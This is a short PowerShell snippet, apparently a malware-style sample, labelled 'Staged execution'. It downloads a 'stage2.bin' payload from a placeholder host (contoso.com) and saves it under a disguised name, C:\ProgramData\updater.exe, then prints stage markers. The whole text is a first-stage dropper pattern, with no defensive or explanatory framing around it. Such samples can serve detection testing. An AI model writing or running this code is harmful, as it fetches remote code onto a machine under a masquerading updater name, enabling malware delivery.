
<# Staged execution #> $Stage2Url = "http://contoso.com:80/cdn/stage2.bin"; $LocalPath = 'C:\ProgramData\updater.exe'; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $LocalPath); Write-Output "stage 28 initialized"; Write-Verbose "stage marker 33 reached"
